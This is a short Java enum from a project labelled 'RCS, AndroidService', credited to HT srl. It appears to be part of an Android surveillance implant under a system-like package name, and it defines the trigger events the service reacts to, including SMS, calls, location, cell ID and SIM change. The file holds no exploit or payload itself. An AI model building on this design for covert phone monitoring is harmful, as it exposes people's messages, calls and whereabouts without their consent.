/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventType.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.event;

import java.util.Hashtable;

public enum EventType {
	/** Events definitions. */
	EVENT_TIMER(Types.BASE + 0x1), // Timer Event
	EVENT_SMS(Types.BASE + 0x2), // On Sms Event
	EVENT_CALL(Types.BASE + 0x3), // On Call Event
	EVENT_CONNECTION(Types.BASE + 0x4), // On Connectivity
	EVENT_PROCESS(Types.BASE + 0x5), // On Process Event
	EVENT_CELLID(Types.BASE + 0x6), // On CellID Event
	EVENT_QUOTA(Types.BASE + 0x7), // On Disk Quota Event
	EVENT_SIM_CHANGE(Types.BASE + 0x8), // On Sim Change
	EVENT_LOCATION(Types.BASE + 0x9), // On Position Event
	EVENT_AC(Types.BASE + 0xA), // On AC (power charger)
	EVENT_BATTERY(Types.BASE + 0xB), // On Battery Level
	EVENT_STANDBY(Types.BASE + 0xC); // On Standby Event

	private int value;

	private EventType(int value) {
		this.value = value;
		Types.map.put(value, this);
	}

	public static EventType get(int value) {
		return Types.map.get(value);
	}

	/**
	 * Value.
	 * 
	 * @return the int
	 */
	public int value() {
		return value;
	}

	/**
	 * map of aliases to enum constants
	 */
	private static final class Types {
		public static int BASE = 0x2000;
		/**
		 * map from name no enum constant
		 */
		static final Hashtable<Integer, EventType> map = new Hashtable<Integer, EventType>();
	}

}
